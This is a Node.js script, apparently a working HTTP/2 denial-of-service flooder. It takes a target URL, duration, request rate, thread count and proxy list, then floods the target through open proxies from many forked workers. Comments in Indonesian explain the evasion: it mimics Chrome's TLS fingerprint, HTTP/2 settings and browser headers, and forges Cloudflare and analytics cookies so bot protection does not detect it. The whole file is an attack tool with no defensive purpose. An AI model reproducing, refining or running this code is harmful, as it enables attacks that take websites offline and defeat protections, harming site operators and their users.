const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const { URL } = require("url"); 
const crypto = require("crypto");
const fs = require("fs");
const colors = require('colors');

const errorHandler = error => {};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
process.setMaxListeners(0);

if (process.argv.length < 7) { 
    console.log(`Usage: target time rate thread proxyfile`.cyan); 
    process.exit(); 
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6],
};

const proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/).filter(line => line.length > 0);
const parsedTarget = new URL(args.target);

const refererPool = [
    "https://www.google.com/search?q=",
    "https://t.co/",
    "https://www.bing.com/",
    "https://l.facebook.com/",
    parsedTarget.origin + "/"
];

// Browser Versions untuk rotasi agar tidak terlihat sebagai bot tunggal
const chromeVersions = ["118", "119", "120", "121"];

function randstr(length) {
    return crypto.randomBytes(Math.ceil(length / 2)).toString('hex').slice(0, length);
}

function shuffleObject(obj) {
    const keys = Object.keys(obj);
    for (let i = keys.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [keys[i], keys[j]] = [keys[j], keys[i]];
    }
    const shuffled = {};
    keys.forEach(key => shuffled[key] = obj[key]);
    return shuffled;
}

if (cluster.isMaster) {
    console.clear();
    console.log(`[ADVANCED BYPASS] `.bold.magenta + `Mimicking High-Reputation Browser Traffic`.white);
    for (let i = 0; i < args.threads; i++) cluster.fork();
    setTimeout(() => process.exit(1), args.time * 1000);
} else {
    setInterval(runFlooder, 1); 
}

class NetSocket {
    HTTP(options, callback) {
        const connection = net.connect({ host: options.host, port: options.port });
        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 120000);

        connection.on("connect", () => {
            connection.write(`CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
        });

        connection.on("data", chunk => {
            if (chunk.toString().includes("HTTP/1.1 200")) callback(connection, undefined);
            else { connection.destroy(); callback(undefined, "proxy_fail"); }
        });

        connection.on("error", err => { connection.destroy(); callback(undefined, err); });
    }
}

const Socker = new NetSocket();

function runFlooder() {
    const proxyAddr = proxies[Math.floor(Math.random() * proxies.length)];
    const proxy = proxyAddr.split(":");
    const chromeVer = chromeVersions[Math.floor(Math.random() * chromeVersions.length)];
    
    Socker.HTTP({
        host: proxy[0],
        port: parseInt(proxy[1]),
        address: parsedTarget.hostname,
        timeout: 10
    }, (connection, error) => {
        if (error) return;

        // STRATEGI 1: TLS Fingerprint Mimicry (JA3)
        // Menggunakan kurva dan ciphers yang identik dengan Chrome untuk menghindari deteksi "menyamar sebagai browser"
        const tlsOptions = {
            socket: connection,
            rejectUnauthorized: false,
            servername: parsedTarget.hostname,
            ALPNProtocols: ['h2'],
            ciphers: [
                "TLS_AES_128_GCM_SHA256",
                "TLS_AES_256_GCM_SHA384",
                "TLS_CHACHA20_POLY1305_SHA256",
                "ECDHE-ECDSA-AES128-GCM-SHA256",
                "ECDHE-RSA-AES128-GCM-SHA256",
                "ECDHE-ECDSA-AES256-GCM-SHA384",
                "ECDHE-RSA-AES256-GCM-SHA384",
                "ECDHE-ECDSA-CHACHA20-POLY1305"
            ].join(":"),
            ecdhCurve: "X25519:prime256v1:secp384r1", // Urutan kurva Chrome
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256",
            honorCipherOrder: true
        };

        const tlsConn = tls.connect(443, parsedTarget.hostname, tlsOptions, () => {
            // STRATEGI 2: HTTP/2 Settings Frame Mimicry
            // Meniru window size dan header table size browser Chrome asli
            const client = http2.connect(parsedTarget.href, {
                protocol: "https",
                createConnection: () => tlsConn,
                settings: { 
                    headerTableSize: 65536,
                    maxConcurrentStreams: 1000,
                    initialWindowSize: 6291456,
                    maxFrameSize: 16384,
                    maxHeaderListSize: 262144,
                    enablePush: false
                }
            });

            const burstAttack = () => {
                for (let i = 0; i < args.Rate; i++) {
                    const dynamicReferer = refererPool[Math.floor(Math.random() * refererPool.length)] + randstr(5);

                    // STRATEGI 3: Header Consistency (Anti-Automation)
                    const reqHeaders = shuffleObject({
                        ":method": "GET",
                        ":authority": parsedTarget.hostname,
                        ":scheme": "https",
                        ":path": parsedTarget.pathname + "?" + randstr(3) + "=" + randstr(7),
                        "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVer}.0.0.0 Safari/537.36`,
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                        "accept-language": "en-US,en;q=0.9,id;q=0.8",
                        "accept-encoding": "gzip, deflate, br, zstd",
                        "referer": dynamicReferer,
                        "sec-ch-ua": `"Google Chrome";v="${chromeVer}", "Chromium";v="${chromeVer}", "Not?A_Brand";v="8"`,
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": '"Windows"',
                        "sec-fetch-dest": "document",
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-site": "cross-site",
                        "sec-fetch-user": "?1",
                        "upgrade-insecure-requests": "1",
                        "priority": "u=0, i", // Chrome H2 Priority
                        "cookie": `__cf_bm=${randstr(48)}; _ga=GA1.1.${Math.floor(Math.random() * 999999)}; _gid=GA1.1.${Math.floor(Math.random() * 999999)}`,
                        "x-forwarded-for": proxy[0] 
                    });

                    const req = client.request(reqHeaders);

                    req.on("response", (res) => {
                        const status = res[":status"];
                        if (status === 403 || status === 429) {
                            client.destroy(); // Buang koneksi jika reputasi IP proxy buruk
                        }
                        req.close();
                        req.destroy();
                    });

                    req.on("error", () => { req.destroy(); });
                    req.end();
                }
            };

            const interval = setInterval(burstAttack, 1000);
            client.on("error", () => { clearInterval(interval); client.destroy(); });
        });

        tlsConn.on("error", () => { connection.destroy(); });
    });
}